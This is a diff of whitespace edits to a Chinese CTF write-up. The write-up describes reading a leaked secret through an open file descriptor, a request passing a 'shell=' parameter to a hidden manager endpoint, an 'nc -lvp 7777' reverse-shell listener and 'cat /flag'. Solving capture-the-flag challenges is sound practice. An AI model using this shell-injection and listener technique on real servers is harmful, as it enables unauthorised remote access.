@@ -2,8 +2,11 @@
 
 ---
 首页长这样
+
 ![[Pasted image 20230104083703.png]]
+
 朴实无华.jpg
+
 ![[Pasted image 20230104083746.png]]
 
 ```php
@@ -82,7 +85,9 @@ if __name__ == '__main__':
 ```
 
 使用`open`打开了，但是没有`close`，可以使用文件描述符读取
+
 默认创建了三个文件描述符，`stdin`、`stdout`和`stderr`
+
 所以`secret.txt`的`fd`应该是`3`
 
 ```php
@@ -101,7 +106,9 @@ no_one_know_the_manager?key=kE2V+hdkhIPOUAJKRtlII96sVqUxsIZiOhjWOqcRr24=&shell=b
 ```shell
 nc -lvp 7777
 ```
+
 ![[Pasted image 20230104094436.png|1000]]
+
 ```shell
 cat /flag
 ```
